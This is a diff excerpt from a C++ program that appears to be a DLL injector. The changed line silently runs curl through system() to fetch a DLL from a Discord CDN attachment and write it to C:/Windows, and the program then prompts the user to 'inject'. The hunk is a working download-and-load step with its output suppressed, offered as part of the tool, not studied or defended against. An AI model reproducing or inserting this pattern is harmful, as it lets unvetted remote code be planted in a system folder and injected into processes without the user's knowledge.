@@ -45,7 +45,7 @@ int main(int argc, const char* argv[]) {
 
 	// --> system("curl {Link Download} --output {Chemin du download de la DLL} >nul 2>&1"); <--
 
-	system("curl https://cdn.discordapp.com/attachments/918450765335502858/941025574577651742/exemple.dll --output C:/Windows/exemple.dll >nul 2>&1");
+	system("curl https://cdn.discordapp.com/attachments/918450765335502858/941025574577651742/exempledll.dll --output C:/Windows/exemple.dll >nul 2>&1");
 	cout << "[" << con::fg_green << "/" << con::fg_white << "] Please press ENTER to " << con::fg_green << "inject " << con::fg_white << "!" << endl;
 	std::cout << "\n";
 
